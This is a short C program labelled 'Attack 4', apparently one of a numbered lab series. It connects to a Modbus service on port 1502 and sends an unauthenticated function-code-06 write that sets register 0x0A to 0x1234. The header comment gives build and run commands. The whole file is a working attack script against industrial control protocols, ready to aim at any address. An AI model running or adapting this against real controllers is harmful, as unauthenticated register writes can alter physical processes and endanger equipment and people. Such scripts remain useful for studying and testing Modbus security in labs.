/*
Attack 4
Build:
  gcc attack_unauth_write.c -o attack_unauth_write
Run:
  ./attack_unauth_write 127.0.0.1
*/

#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(1502);
    inet_pton(AF_INET, argv[1], &sa.sin_addr);
    connect(fd, (struct sockaddr*)&sa, sizeof(sa));

    printf("[*] Sending raw Modbus write without authentication\n");

    uint8_t modbus_fc6[] = {
        0x00,0x01,  // TID
        0x00,0x00,  // PID
        0x00,0x06,  // LEN
        0x01,       // Unit
        0x06,       // FC06
        0x00,0x0A,  // addr
        0x12,0x34   // value
    };

    send(fd, modbus_fc6, sizeof(modbus_fc6), 0);
    close(fd);
    return 0;
}
